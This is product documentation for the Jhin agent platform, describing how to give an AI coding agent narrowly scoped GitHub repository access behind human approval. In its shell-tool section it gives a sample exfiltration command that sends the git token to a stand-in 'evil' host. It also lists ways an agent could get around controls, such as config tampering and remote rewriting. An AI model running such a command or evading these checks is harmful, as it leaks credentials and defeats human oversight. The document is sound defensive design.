# Pointing an agent at a real repository

Four steps, once. At the end an agent can clone a repository it has never seen,
find its way around it, change code, run the tests, and — after you approve it —
push a branch and open a pull request.

Nothing here needs an OAuth app, a GitHub App, or a publicly reachable Jhin.

## 1. Mint a fine-grained token

GitHub → **Settings → Developer settings → Personal access tokens →
Fine-grained tokens → Generate new token**.

- **Repository access:** *Only select repositories* — the specific repositories
  agents may touch. Not "All repositories".
- **Permissions:**

  | Permission | Level | Why |
  | --- | --- | --- |
  | Contents | Read and write | clone, commit, push a branch |
  | Pull requests | Read and write | open the pull request |
  | Metadata | Read | mandatory alongside the two above |

- **Workflows: Read and write** — only if agents will edit `.github/workflows/**`.
  GitHub refuses a push that touches a workflow file without it.
- **Expiration:** short. Rotating is one paste (Apps → the connection →
  Advanced settings → rotate credentials).

This list is the one that matters. Jhin has its own allow-list in step 3 and it
is worth setting, but assume a sufficiently over-granted sandbox can leak a
token and make the token itself narrow.

## 2. Connect GitHub in Jhin

**Apps → GitHub → Connect → Personal access token**, paste, save. Jhin does a
live `GET /user` and shows you which account it authenticated as. The token goes
straight into the envelope-encrypted secret store; no API route ever returns it.

If GitHub later rejects the token — revoked, expired — the connection shows
*needs reconnecting* rather than a red error, because pasting a new one is the
whole cure.

## 3. Connect a CLI Sandbox

**Apps → CLI Sandbox → Connect**:

| Field | Value |
| --- | --- |
| Default network policy | `none` |
| GitHub connection for repository jobs | the connection from step 2 |
| Repositories this sandbox may use | `octo/alpha` (one per line; `octo/*` works) |

**Empty means no repository work at all.** A CLI connection that lists nothing
refuses every checkout and every push, and says so by name. This is the one
place in the product that answers "which repositories can this instance touch",
independently of what any individual agent was granted.

The GitHub connection named here is the *only* credential repository jobs can
borrow. No tool call can ask for a different one; if you need a second
credential, create a second CLI Sandbox connection.

## 4. Give the agent the Code editing capability

**Agent → Tools & Access → Code editing** (or the same preset in the agent
creation wizard). It grants:

`cli.repository.checkout`, `cli.file.list`, `cli.file.search`, `cli.file.read`,
`cli.file.edit`, `cli.file.write`, `cli.test.run`, `cli.repository.push`,
`github.repository.read`, `github.pull_request.read`,
`github.pull_request.create`.

Then **replace `*` with the real repository names** in the `repository` scopes,
and check that the `connection_id` scopes point at the connections from steps 2
and 3. The wizard fills the connection in automatically when the workspace has
exactly one of each type.

Two things the preset deliberately does not include:

- **`cli.command.execute`** — a general shell. A grant scope is one `fnmatch`
  over a shell string, so `command: "git *"` also matches
  `git commit -m x && curl https://evil/?t=$GIT_TOKEN`. Pushing has its own
  tool so the credential never reaches a command an agent wrote. The shell
  remains available as an operator-granted escape hatch for builds and linters,
  and it never receives a git credential.
- **`github.pull_request.merge`** — opening a pull request is the end of the
  agent's job.

Leave the agent's approval preset at **Balanced**. If you choose **Autonomous**,
keep the preset's `cli.repository.push` approval rule: Autonomous runs elevated
tools unattended, and that rule is the only reason a push still pauses.

Give the agent at least 12 steps. The loop is nine tool calls plus reporting
back.

## What the agent then does

> "Fix the failing test in octo/alpha and open a pull request."

| # | Call | Gate |
| --- | --- | --- |
| 1 | `cli.repository.checkout` — clone, branch `agent/<task>-<repo>`, returns the base ref and the top-level entries | auto |
| 2 | `cli.file.search` — where is the failing symbol | auto |
| 3 | `cli.test.run` — red | auto |
| 4 | `cli.file.read` — the relevant page, with a `read_token` | auto |
| 5 | `cli.file.edit` — replace an exact string, failing loudly if it is not unique | auto |
| 6 | `cli.test.run` — green | auto |
| 7 | `cli.repository.push` — commit and push the branch | **you approve** |
| 8 | `github.pull_request.create` | auto |

The approval arrives in the approvals inbox with the branch, the repository and
the commit message the agent chose. Approving it is the only moment anything
this agent did leaves the sandbox.

## When something is refused

Every refusal names itself, so the agent can usually correct itself in one step
and you can tell a bug from a boundary:

| Code | Means |
| --- | --- |
| `repository_not_allowed` | the CLI connection does not list that repository; the message names the ones it does |
| `required_scope_missing` | the grant does not pin every dimension the tool requires; the message names the missing one (see [the upgrade note](grant-scope-migration.md)) |
| `push_to_base_refused` | the agent tried to push onto `main`/`master`/the ref the checkout was cut from |
| `branch_not_checked_out` | the branch asked for is not the one in the sandbox |
| `no_checkout_record` | no checkout of that repository was recorded in this run, so there is nothing to check the sandbox against |
| `repo_config_tampered` | the repository's local git config carries entries Jhin did not write, or no longer hashes to what the checkout recorded; the push was refused and a `sandbox.repo_config_tampered` audit event recorded |
| `remote_rewritten` | `remote.origin.url` is not exactly the one URL Jhin cloned — a second value counts |
| `file_changed` / `file_exists_pass_read_token` | a write that did not carry the `read_token` from a current read of that file |
| `hard_linked_file` | the file has a second name on disk (a hard link into `.git`, for instance), so the file tools will not touch it |
| `invalid_input` on a `.git` path | the file tools do not touch git's own state, ever |
| `approval_connection_changed` | the connection changed while the push waited for you; approve a fresh request |
